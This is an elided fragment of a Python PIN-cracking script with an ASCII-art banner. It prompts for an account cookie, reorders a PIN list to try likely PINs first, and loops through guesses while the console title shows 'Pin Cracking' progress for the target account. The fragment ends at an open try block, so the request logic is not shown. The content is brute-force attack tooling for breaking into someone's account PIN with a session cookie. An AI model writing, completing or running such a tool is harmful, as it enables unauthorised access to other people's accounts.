...
print('''
  _      ______ _____  ____        _____  ________      __
 ...
 |______|______\_____|\____/      |_____/|______|   \/    
    ...
    ''')
credentials = input('Enter The Account Cookie: ')
...
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Likely Pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking... I Account {username} I Pins Tried: {tried} I Current Pin: {pin}')
    try:
